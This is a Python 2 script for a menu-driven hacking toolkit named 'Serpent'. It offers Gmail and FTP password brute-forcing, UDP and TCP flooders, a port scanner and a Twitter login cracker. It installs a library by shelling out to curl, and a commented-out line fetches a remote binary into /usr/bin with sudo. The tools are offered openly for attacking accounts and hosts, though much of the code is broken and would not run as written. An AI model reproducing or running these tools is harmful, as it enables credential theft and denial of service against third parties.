import sys
import os
import time
import smtplib
import ftplib
import socket
import random
import threading
import urllib
import urllib2
from ftplib import FTP, error_perm
from smtplib import SMTP
import mechanize
import cookielib
import subprocess
#preflight
os.system("mkdir ~/Serpent")

os.system("clear")  #Change to cls if running w32#

def main():
    selection = raw_input("Serpent$ ")
    if selection == "help":
        print '1. Gmailbruteforce            8. Twitter cracker'
        print '2. Ftpbruteforce              9. Auto-Anonimyzer'
        print '3. Udp flooder'
        print '4. Tcp flooder'
        print '5. ssh bruteforce'
        print '6. Port scanner'
        print '7. Python server'
        main();

    elif selection == "1":
        smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
        smtpserver.starttls()
        smtpserver.ehlo()
        user = raw_input("Enter email address: ")
        passd = open(sys.argv[1], 'r')
        for username in user:
            for password in passd:
                    try:
                        smtpserver.login(user, password)
                        print "{*} Password Found: %s" %password
                    except(smtplib.SMTPAuthenticationError), msg:
                        if 'Username a' in str(msg):
                            print '{} Password not: %s' %password
                        else:
                            break
        main();
    elif selection == "2":
        print "[*] FTP Bruteforcer starting..."
        server = raw_input("Server: ")
        login2 = raw_input("User: ")
        passw = open(sys.argv[1], 'r').readlines()
        for username in login2:
            for password in passw:
                try:
                    ftp = FTP(server)
                    ftp.login(login2, password)
                    print "{+} Password Found: %s" %password
                except(ftplib.error_perm), msg:
                    if "530" in str(msg):
                        print "[!] Password is not: %s" %password
                    else:
                        break
        main();
    elif selection == "3":
        print "[*] UDP packet flooder starting..."
        class Controller(threading.Thread):
            def __init__(self, ip, port, size):
                threading.Thread.__init__(self)
                self.ip = ip
                self.port = port
                self.size = size
                def run(self):
                    print "-__-----------_____-___----_" + self.ip + ":"
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    port = 8080
                    bytes = random._urandom(self.size)
                    while 2:
                        s.sendto(bytes,(self.ip, self.port))
                        print "Enter ip address"
                        ip = raw_input("IP Address: ")
                        threads = 100
                        for host in range(int(threads)):
                            atck = Controller(ip, int(port), int(size))
                            atck.start()
        main();
    elif selection == "4":
        print "[*] TCP Flooder starting..."
        host = raw_input("Enter host: ")
        port = 80
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bytes = random._urandom(7000)
        while 3:
            print '___________--________---_____-_---__-___' + "[data]"
            s.sendto(bytes,(host, port))
        main();
    elif selection == "5":
        print ("I am sorry this is not available on free version at this moment")
        main();
    elif selection == "6":
        print "[*] Arbitrary Port scanner starting..."
        ip = raw_input("Enter Ip Address: ")
        def scan_ports(ip, port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((ip, port))
                return True
            except:
                return None
            for port in range(0, 100000):
                attempt = scan_ports(ip, port)
                if attempt == True:
                    print ("PORT OPEN %d") %port
                else:
                    print ("PORT CLOSED %d") %port
                    break
        main();
    elif selection == "7":
        print "Still under construction..."
        #server_location = raw_input     #FINISH THIS
        main();
    elif selection == "8":
        print "[*]Twitter Cracker Starting..."
        os.system("clear") #Change to cls if w32
        os.system("curl -ssl https://pypi.python.org/packages/source/m/mechanize/mechanize-0.2.5.zip#md5=a497ad4e875f7506ffcf8ad3ada4c2fc -o ~/Serpent/mech.zip")
        os.system("cd ~/Serpent && unzip mech.zip")
        os.system("python ~/Serpent/mechanize-0.2.5/setup.py install")
        username = str(raw_input("Enter Username: "))
        passwordlist = str(raw_input("Enter the name of the password list file : "))

        useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



        login = 'https://twitter.com/login/'
        def attack(password):

                    try:
                        print "\r[*] trying %s" % password
                        sys.stdout.flush()
                        br.addheaders = [('User-agent', random.choice(useragents))]
                        site = br.open(login)
                        br.select_form(nr=1)
                         ##Twitter
                        br.form['session[username_or_email]'] = username
                        br.form['session[password]'] = password
                        br.submit()
                        log = br.geturl()
                        if log == 'https://twitter.com/' :
                            print "\n\n\n [*] Password found .. !!"
                            print "\n [*] Password : %s\n" % (password)
                            sys.exit(1)
                    except KeyboardInterrupt:
                        print "\n[*] Exiting program .. "
                        sys.exit(1)

        def search():
            global password
            for password in passwords:
                attack(password.replace("\n",""))



        def check():
            global br
            global passwords
            try:
               br = mechanize.Browser()
               cj = cookielib.LWPCookieJar()
               br.set_handle_robots(False)
               br.set_handle_equiv(True)
               br.set_handle_referer(True)
               br.set_handle_redirect(True)
               br.set_cookiejar(cj)
               br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            except KeyboardInterrupt:
                print "\n[*] Exiting program ..\n"
                sys.exit(1)
            try:
                list = open(passwordlist, "r")
                passwords = list.readlines()
                k = 0
                while k < len(passwords):
                    passwords[k] = passwords[k].strip()
                    k += 1
            except IOError:
                print "\n [*] Error: check your password list path \n"
                sys.exit(1)
            except KeyboardInterrupt:
                print "\n [*] Exiting program ..\n"
                sys.exit(1)
            try:
                print " [*] Account to crack : %s" % (username)
                print " [*] Loaded :" , len(passwords), "passwords"
                print " [*] Cracking, please wait ..."
            except KeyboardInterrupt:
                print "\n [*] Exiting program ..\n"
                sys.exit(1)
            try:
                search()
                attack(password)
            except KeyboardInterrupt:
                print "\n [*] Exiting program ..\n"
                sys.exit(1)
        main();
    elif selection == "9":
        print "Under Progress"
        #if "not found" in str(os.system("tortle -e")):
            #os.system("sudo curl https://raw.githubusercontent.com/thrifus/Tortle/master/tortle -o /usr/bin/tortle && sudo chmod +x /usr/bin/tortle")
        #elif "not found" in str(os.system("tor")):
#Insert ability to install tor source code
            #os.system("tor")
        main();
    elif selection == "exit":
        sys.exit(1)
    elif selection == "clear":
        os.system("clear")
        main();
    else:
        print "Type help to learn commands..."
        main();
main();
